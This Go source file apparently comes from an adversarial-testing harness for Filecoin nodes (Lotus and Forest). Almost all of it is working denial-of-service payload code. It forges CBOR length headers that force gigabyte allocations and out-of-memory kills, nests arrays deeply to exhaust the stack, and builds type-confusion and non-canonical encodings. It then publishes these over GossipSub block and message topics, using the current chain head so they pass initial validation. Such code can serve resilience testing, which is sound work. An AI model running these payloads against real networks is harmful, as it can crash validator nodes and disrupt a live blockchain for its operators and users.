package main

import (
	"fmt"
	"log"

	"github.com/ipfs/go-cid"
)

// ---------------------------------------------------------------------------
// CBOR Length-Prefix OOM Attacks
//
// CBOR encodes collection sizes in the header: an array of 5 elements starts
// with a header byte saying "array, length 5". Decoders typically read this
// header and pre-allocate: make([]T, length). If an attacker writes a header
// claiming 1 billion elements but provides zero actual data, the decoder
// allocates ~8GB (for []cid.Cid) or more before discovering the data is
// missing — killing the process via OOM.
//
// These vectors craft otherwise-valid Filecoin wire messages (BlockMsg,
// SignedMessage) where one specific field has a falsified CBOR length header.
// They are published via GossipSub to /fil/blocks/ and /fil/msgs/ topics,
// hitting the CBOR decode path in both Lotus and Forest validators.
//
// The bytestring variant (cborBytesWithFakeLength) does the same for raw
// byte fields like Message.Params or Signature — the decoder calls
// make([]byte, claimedLen) before reading.
// ---------------------------------------------------------------------------

const oomAllocSize = 1_000_000_000 // 1 billion — triggers ~8GB+ pre-allocation

func getAllCBORBombAttacks() []namedAttack {
	return []namedAttack{
		// BlockHeader field OOM — published to /fil/blocks/ topic
		{name: "blocks/all-block-with-fake-length-parents-array", fn: oomHeaderParents},
		{name: "blocks/all-block-with-fake-length-beacon-entries", fn: oomHeaderBeaconEntries},
		{name: "blocks/all-block-with-fake-length-winpost-proof", fn: oomHeaderWinpostProof},

		// BlockMsg CID array OOM — published to /fil/blocks/ topic
		{name: "blocks/all-blockmsg-with-fake-length-bls-cids", fn: oomBlockmsgBlsCids},
		{name: "blocks/all-blockmsg-with-fake-length-secpk-cids", fn: oomBlockmsgSecpkCids},

		// SignedMessage field OOM — published to /fil/msgs/ topic
		{name: "msgs/all-signed-message-with-fake-length-params", fn: oomSignedmsgParams},
		{name: "msgs/all-signed-message-with-fake-length-signature", fn: oomSignedmsgSignature},

		// Stack exhaustion via deep nesting
		{name: "blocks/all-block-with-deeply-nested-cbor", fn: stackDeeplyNestedCBOR},

		// Forest 8MB Rust stack exhaustion (deeper nesting)
		{name: "blocks/all-block-with-deep-nested-beacon-500-2000", fn: stackForestDeepBeacon},
		{name: "blocks/all-block-with-deep-nested-alternating-array-map", fn: stackForestDeepAlternating},
		{name: "msgs/all-signed-message-with-deep-nested-params", fn: stackForestDeepMsgParams},

		// DAG-CBOR strictness violations (Forest serde_ipld_dagcbor)
		{name: "blocks/all-block-with-indefinite-length-array", fn: dagcborIndefiniteArrayBlock},
		{name: "msgs/all-signed-message-with-indefinite-length-array", fn: dagcborIndefiniteArrayMsg},
		{name: "blocks/all-block-with-noncanonical-integer-encoding", fn: dagcborNonCanonicalUintBlock},
		{name: "msgs/all-signed-message-with-noncanonical-integer-encoding", fn: dagcborNonCanonicalUintMsg},

		// CBOR type confusion attacks
		{name: "blocks/all-block-with-cbor-map-instead-of-array", fn: typeconfMapWhereArrayBlock},
		{name: "blocks/all-block-with-text-string-instead-of-bytes", fn: typeconfTextWhereBytesBlock},
		{name: "blocks/all-block-with-duplicate-cbor-map-keys", fn: typeconfDuplicateMapKeysBlock},

		// Additional OOM paths (text string and map headers)
		{name: "blocks/all-block-with-fake-length-text-string", fn: oomHeaderTextString},
		{name: "blocks/all-block-with-fake-length-map", fn: oomHeaderMapHeader},
	}
}

// ---------------------------------------------------------------------------
// Shared helpers
// ---------------------------------------------------------------------------

// buildDefaultHeaderFields returns the 16 BlockHeader CBOR fields as a slice.
// Uses current chain head for realistic parents/height so the message passes
// initial topic validation before reaching the vulnerable decode path.
func buildDefaultHeaderFields() [][]byte {
	headInfo := fetchChainHead(rngChoice(targets).Name)

	var parentsCBOR []byte
	height := uint64(1)
	weight := uint64(999999999)

	if headInfo != nil {
		parentsCBOR = cborCIDArray(headInfo.CIDs)
		height = headInfo.Height + 1
	} else {
		parentsCBOR = cborCIDArray([]cid.Cid{randomCID()})
	}

	return [][]byte{
		cborBytes([]byte{0x00, 0xe8, 0x07}),                   // [0]  Miner (f01000)
		cborArray(cborBytes(randomBytes(32))),                   // [1]  Ticket
		cborArray(cborInt64(1), cborBytes(randomBytes(32))),     // [2]  ElectionProof
		cborArray(),                                             // [3]  BeaconEntries
		cborArray(),                                             // [4]  WinPoStProof
		parentsCBOR,                                             // [5]  Parents
		cborBytes(bigIntBytes(weight)),                          // [6]  ParentWeight
		cborUint64(height),                                      // [7]  Height
		cborCID(randomCID()),                                    // [8]  ParentStateRoot
		cborCID(emptyAMTCID),                                    // [9]  ParentMessageReceipts
		cborCID(emptyMsgMetaCID),                                // [10] Messages
		cborBytes([]byte{0x02}),                                 // [11] BLSAggregate
		cborUint64(1700000000),                                  // [12] Timestamp
		cborBytes(append([]byte{0x02}, randomBytes(8)...)),      // [13] BlockSig
		cborUint64(0),                                           // [14] ForkSignaling
		cborBytes(bigIntBytes(100)),                             // [15] ParentBaseFee
	}
}

// buildBlockMsgWithBombedField constructs a BlockMsg where one of the 16
// BlockHeader fields is replaced with a bomb payload.
func buildBlockMsgWithBombedField(fieldIndex int, bomb []byte) []byte {
	fields := buildDefaultHeaderFields()
	if fieldIndex >= 0 && fieldIndex < len(fields) {
		fields[fieldIndex] = bomb
	}
	header := cborArray(fields...)
	return cborArray(header, cborArray(), cborArray())
}

func publishBlock(data []byte) {
	publishGossipPayload(fmt.Sprintf("/fil/blocks/%s", networkName), data)
}

func publishMsg(data []byte) {
	publishGossipPayload(fmt.Sprintf("/fil/msgs/%s", networkName), data)
}

// ---------------------------------------------------------------------------
// BlockHeader field OOM vectors
//
// BlockHeader is a 16-field CBOR array. Fields 3 (BeaconEntries), 4
// (WinPoStProof), and 5 (Parents) are variable-length arrays decoded with
// make([]T, cborLength). A falsified length triggers OOM.
//
// Wire path: GossipSub → /fil/blocks/ → DecodeBlockMsg → BlockHeader
//            UnmarshalCBOR → make([]T, fakeLength) → OOM
// ---------------------------------------------------------------------------

// oomHeaderParents: Parents field (index 5) is an array of parent CIDs.
// Decoder allocates make([]cid.Cid, 1B) = ~40GB before reading any CID data.
func oomHeaderParents() {
	data := buildBlockMsgWithBombedField(5, cborArrayWithFakeLength(oomAllocSize))
	log.Printf("[oom] header-parents: %d bytes to /fil/blocks/", len(data))
	publishBlock(data)
}

// oomHeaderBeaconEntries: BeaconEntries field (index 3) is an array of drand
// beacon outputs. Decoder allocates make([]BeaconEntry, 1B).
func oomHeaderBeaconEntries() {
	data := buildBlockMsgWithBombedField(3, cborArrayWithFakeLength(oomAllocSize))
	log.Printf("[oom] header-beacon-entries: %d bytes to /fil/blocks/", len(data))
	publishBlock(data)
}

// oomHeaderWinpostProof: WinPoStProof field (index 4) is an array of proof
// structs. Decoder allocates make([]PoStProof, 1B).
func oomHeaderWinpostProof() {
	data := buildBlockMsgWithBombedField(4, cborArrayWithFakeLength(oomAllocSize))
	log.Printf("[oom] header-winpost-proof: %d bytes to /fil/blocks/", len(data))
	publishBlock(data)
}

// ---------------------------------------------------------------------------
// BlockMsg CID array OOM vectors
//
// BlockMsg = [Header, BlsMessages []CID, SecpkMessages []CID]
// The CID arrays are decoded before any validation. A falsified array length
// triggers make([]cid.Cid, 1B) = ~40GB allocation.
//
// Wire path: GossipSub → /fil/blocks/ → DecodeBlockMsg → make([]cid.Cid, N)
// ---------------------------------------------------------------------------

// oomBlockmsgBlsCids: BlsMessages CID array (BlockMsg field 1) claims 1B CIDs.
func oomBlockmsgBlsCids() {
	fields := buildDefaultHeaderFields()
	header := cborArray(fields...)
	data := cborArray(header, cborArrayWithFakeLength(oomAllocSize), cborArray())
	log.Printf("[oom] blockmsg-bls-cids: %d bytes to /fil/blocks/", len(data))
	publishBlock(data)
}

// oomBlockmsgSecpkCids: SecpkMessages CID array (BlockMsg field 2) claims 1B CIDs.
func oomBlockmsgSecpkCids() {
	fields := buildDefaultHeaderFields()
	header := cborArray(fields...)
	data := cborArray(header, cborArray(), cborArrayWithFakeLength(oomAllocSize))
	log.Printf("[oom] blockmsg-secpk-cids: %d bytes to /fil/blocks/", len(data))
	publishBlock(data)
}

// ---------------------------------------------------------------------------
// SignedMessage field OOM vectors
//
// SignedMessage = [Message, Signature]
// Message = [Version, To, From, Nonce, Value, GasLimit, GasFeeCap,
//            GasPremium, Method, Params]
//
// Params (index 9) is a raw bytestring — decoder allocates make([]byte, len).
// Signature is also a bytestring.
//
// Wire path: GossipSub → /fil/msgs/ → DecodeSignedMessage → Message
//            UnmarshalCBOR → make([]byte, fakeParamsLen) → OOM
//
// Lotus MessageValidator.Validate() has NO recover(). If the decode itself
// allocates too much, the process is killed by the OOM killer.
// ---------------------------------------------------------------------------

// oomSignedmsgParams: Message.Params bytestring claims 1GB.
// Decoder calls make([]byte, 1_000_000_000) to read the params field.
func oomSignedmsgParams() {
	validAddr := cborBytes([]byte{0x00, 0xe8, 0x07})
	msg := cborArray(
		cborUint64(0),                          // Version
		validAddr,                              // To
		validAddr,                              // From
		cborUint64(0),                          // Nonce
		cborBytes(bigIntBytes(0)),              // Value
		cborInt64(1000000),                     // GasLimit
		cborBytes(bigIntBytes(100)),            // GasFeeCap
		cborBytes(bigIntBytes(100)),            // GasPremium
		cborUint64(0),                          // Method
		cborBytesWithFakeLength(oomAllocSize, nil), // Params: header says 1GB, body is empty
	)
	sig := cborBytes(append([]byte{0x01}, randomBytes(65)...))
	data := cborArray(msg, sig)
	log.Printf("[oom] signedmsg-params: %d bytes to /fil/msgs/", len(data))
	publishMsg(data)
}

// oomSignedmsgSignature: Signature bytestring claims 1GB.
// Decoder calls make([]byte, 1_000_000_000) to read the signature.
func oomSignedmsgSignature() {
	msg := buildMessageCBOR(nil)
	data := cborArray(msg, cborBytesWithFakeLength(oomAllocSize, []byte{0x01}))
	log.Printf("[oom] signedmsg-signature: %d bytes to /fil/msgs/", len(data))
	publishMsg(data)
}

// ---------------------------------------------------------------------------
// Stack exhaustion
//
// CBOR allows arbitrary nesting: array-of-array-of-array... If the decoder
// uses recursion, deep nesting exhausts the goroutine/thread stack.
// Go goroutines have a default 1GB stack limit but can still hit issues
// with deeply recursive CBOR-gen. Rust threads have an 8MB default stack.
//
// Wire path: GossipSub → /fil/blocks/ → DecodeBlockMsg → BlockHeader
//            UnmarshalCBOR → recursive decode → stack overflow
// ---------------------------------------------------------------------------

// stackDeeplyNestedCBOR: 100-200 levels of nested CBOR arrays placed in the
// BeaconEntries field. Each level adds a recursive decode call.
func stackDeeplyNestedCBOR() {
	depth := 100 + rngIntn(100)
	inner := cborUint64(42)
	for i := 0; i < depth; i++ {
		inner = cborArray(inner)
	}
	fields := buildDefaultHeaderFields()
	fields[3] = inner // BeaconEntries = deeply nested
	header := cborArray(fields...)
	data := cborArray(header, cborArray(), cborArray())
	log.Printf("[stack] deeply-nested-cbor: depth=%d, %d bytes to /fil/blocks/", depth, len(data))
	publishBlock(data)
}

// ---------------------------------------------------------------------------
// Forest-targeted attacks
//
// Forest (Rust) differs from Lotus (Go):
//   - Thread stack: 8MB default (vs Go's dynamically-growing 1GB)
//   - CBOR decoder: serde_ipld_dagcbor (strict DAG-CBOR) vs cbor-gen (lenient)
//   - Indefinite-length CBOR: forbidden by DAG-CBOR but may not be validated
//   - Non-canonical integers: DAG-CBOR requires minimal encoding
//   - Type confusion: serde may panic on unexpected CBOR major types
// ---------------------------------------------------------------------------

// stackForestDeepBeacon: 500-2000 depth for Forest's 8MB Rust thread stack.
// Current 100-200 depth is insufficient. Rust stack overflow at ~500+.
func stackForestDeepBeacon() {
	depth := 500 + rngIntn(1500)
	inner := cborUint64(42)
	for i := 0; i < depth; i++ {
		inner = cborArray(inner)
	}
	fields := buildDefaultHeaderFields()
	fields[3] = inner
	header := cborArray(fields...)
	data := cborArray(header, cborArray(), cborArray())
	log.Printf("[stack-forest] deep-beacon: depth=%d, %d bytes to /fil/blocks/", depth, len(data))
	publishBlock(data)
}

// stackForestDeepAlternating: Alternating array→map→array nesting.
// Exercises different Rust serde recursion paths (visit_seq vs visit_map).
func stackForestDeepAlternating() {
	depth := 500 + rngIntn(1500)
	inner := cborUint64(42)
	for i := 0; i < depth; i++ {
		if i%2 == 0 {
			inner = cborArray(inner)
		} else {
			inner = cborMap(cborUint64(0), inner)
		}
	}
	fields := buildDefaultHeaderFields()
	fields[3] = inner
	header := cborArray(fields...)
	data := cborArray(header, cborArray(), cborArray())
	log.Printf("[stack-forest] deep-alternating: depth=%d, %d bytes to /fil/blocks/", depth, len(data))
	publishBlock(data)
}

// stackForestDeepMsgParams: Deep nesting in SignedMessage Params field.
// Hits the Message decoder path (separate from BlockHeader).
func stackForestDeepMsgParams() {
	depth := 500 + rngIntn(1500)
	inner := cborUint64(42)
	for i := 0; i < depth; i++ {
		inner = cborArray(inner)
	}
	validAddr := cborBytes([]byte{0x00, 0xe8, 0x07})
	msg := cborArray(
		cborUint64(0), validAddr, validAddr, cborUint64(0),
		cborBytes(bigIntBytes(0)), cborInt64(1000000),
		cborBytes(bigIntBytes(100)), cborBytes(bigIntBytes(100)),
		cborUint64(0), inner,
	)
	sig := cborBytes(append([]byte{0x01}, randomBytes(65)...))
	data := cborArray(msg, sig)
	log.Printf("[stack-forest] deep-msg-params: depth=%d, %d bytes to /fil/msgs/", depth, len(data))
	publishMsg(data)
}

// dagcborIndefiniteArrayBlock: Block with indefinite-length CBOR array (0x9F...0xFF).
// DAG-CBOR forbids indefinite-length. If Forest's decoder doesn't reject,
// it may process data differently or panic on break codes.
func dagcborIndefiniteArrayBlock() {
	fields := buildDefaultHeaderFields()
	fields[3] = cborIndefiniteArray() // BeaconEntries as indefinite-length
	header := cborArray(fields...)
	data := cborArray(header, cborArray(), cborArray())
	log.Printf("[dagcbor] indefinite-array-block: %d bytes to /fil/blocks/", len(data))
	publishBlock(data)
}

// dagcborIndefiniteArrayMsg: SignedMessage with indefinite-length inner Message array.
func dagcborIndefiniteArrayMsg() {
	validAddr := cborBytes([]byte{0x00, 0xe8, 0x07})
	msg := cborIndefiniteArray(
		cborUint64(0), validAddr, validAddr, cborUint64(0),
		cborBytes(bigIntBytes(0)), cborInt64(1000000),
		cborBytes(bigIntBytes(100)), cborBytes(bigIntBytes(100)),
		cborUint64(0), cborBytes(nil),
	)
	sig := cborBytes(append([]byte{0x01}, randomBytes(65)...))
	data := cborArray(msg, sig)
	log.Printf("[dagcbor] indefinite-array-msg: %d bytes to /fil/msgs/", len(data))
	publishMsg(data)
}

// dagcborNonCanonicalUintBlock: Block with non-canonical integer encoding.
// DAG-CBOR requires minimal encoding (0 = 1 byte). We use 9 bytes for small values.
func dagcborNonCanonicalUintBlock() {
	fields := buildDefaultHeaderFields()
	fields[7] = cborNonCanonicalUint64(1)          // Height
	fields[12] = cborNonCanonicalUint64(1700000000) // Timestamp
	fields[14] = cborNonCanonicalUint64(0)          // ForkSignaling
	header := cborArray(fields...)
	data := cborArray(header, cborArray(), cborArray())
	log.Printf("[dagcbor] noncanonical-uint-block: %d bytes to /fil/blocks/", len(data))
	publishBlock(data)
}

// dagcborNonCanonicalUintMsg: SignedMessage with non-canonical integer encoding.
func dagcborNonCanonicalUintMsg() {
	validAddr := cborBytes([]byte{0x00, 0xe8, 0x07})
	msg := cborArray(
		cborNonCanonicalUint64(0), validAddr, validAddr,
		cborNonCanonicalUint64(0),
		cborBytes(bigIntBytes(0)), cborNonCanonicalUint64(1000000),
		cborBytes(bigIntBytes(100)), cborBytes(bigIntBytes(100)),
		cborNonCanonicalUint64(0), cborBytes(nil),
	)
	sig := cborBytes(append([]byte{0x01}, randomBytes(65)...))
	data := cborArray(msg, sig)
	log.Printf("[dagcbor] noncanonical-uint-msg: %d bytes to /fil/msgs/", len(data))
	publishMsg(data)
}

// typeconfMapWhereArrayBlock: Block where BlockHeader is a CBOR map instead of array.
// Decoder expects MajArray but gets MajMap — may panic on type mismatch.
func typeconfMapWhereArrayBlock() {
	fields := buildDefaultHeaderFields()
	var entries [][]byte
	for i, f := range fields {
		entries = append(entries, cborUint64(uint64(i)), f)
	}
	header := cborMap(entries...)
	data := cborArray(header, cborArray(), cborArray())
	log.Printf("[typeconf] map-where-array-block: %d bytes to /fil/blocks/", len(data))
	publishBlock(data)
}

// typeconfTextWhereBytesBlock: Block where byte-string fields use text-string type.
// CBOR major type 3 (text) vs 2 (bytes). May cause type assertion panic.
func typeconfTextWhereBytesBlock() {
	fields := buildDefaultHeaderFields()
	fields[0] = cborTextString(string([]byte{0x00, 0xe8, 0x07}))  // Miner
	fields[11] = cborTextString(string([]byte{0x02}))              // BLSAggregate
	header := cborArray(fields...)
	data := cborArray(header, cborArray(), cborArray())
	log.Printf("[typeconf] text-where-bytes-block: %d bytes to /fil/blocks/", len(data))
	publishBlock(data)
}

// typeconfDuplicateMapKeysBlock: Block with CBOR map containing duplicate keys
// where an array is expected. DAG-CBOR forbids duplicates.
func typeconfDuplicateMapKeysBlock() {
	dupMap := cborMap(
		cborUint64(0), cborBytes(randomBytes(32)),
		cborUint64(0), cborBytes(randomBytes(32)), // duplicate key
	)
	fields := buildDefaultHeaderFields()
	fields[3] = dupMap // BeaconEntries
	header := cborArray(fields...)
	data := cborArray(header, cborArray(), cborArray())
	log.Printf("[typeconf] duplicate-map-keys-block: %d bytes to /fil/blocks/", len(data))
	publishBlock(data)
}

// oomHeaderTextString: OOM via text string header claiming 1B bytes.
// Exercises the text-string allocation path (separate from byte-string).
func oomHeaderTextString() {
	data := buildBlockMsgWithBombedField(6, cborTextWithFakeLength(oomAllocSize))
	log.Printf("[oom] header-text-string: %d bytes to /fil/blocks/", len(data))
	publishBlock(data)
}

// oomHeaderMapHeader: OOM via map header claiming 1B entries.
// Exercises the map allocation path (separate from array).
func oomHeaderMapHeader() {
	data := buildBlockMsgWithBombedField(3, cborMapWithFakeLength(oomAllocSize))
	log.Printf("[oom] header-map-header: %d bytes to /fil/blocks/", len(data))
	publishBlock(data)
}

// getAllForestAttacks returns Forest-specific vectors for the FOREST weight category.
// These target Rust decoder differences and are published via GossipSub (nodeAny).
func getAllForestAttacks() []namedAttack {
	attacks := []namedAttack{
		{name: "blocks/forest-block-with-deep-nested-beacon", fn: stackForestDeepBeacon},
		{name: "blocks/forest-block-with-deep-nested-alternating", fn: stackForestDeepAlternating},
		{name: "msgs/forest-signed-message-with-deep-nested-params", fn: stackForestDeepMsgParams},
		{name: "blocks/forest-block-with-indefinite-length-array", fn: dagcborIndefiniteArrayBlock},
		{name: "msgs/forest-signed-message-with-indefinite-length-array", fn: dagcborIndefiniteArrayMsg},
		{name: "blocks/forest-block-with-noncanonical-integer", fn: dagcborNonCanonicalUintBlock},
		{name: "msgs/forest-signed-message-with-noncanonical-integer", fn: dagcborNonCanonicalUintMsg},
	}
	attacks = append(attacks, getAllFVMAddressAttacks()...)
	return attacks
}
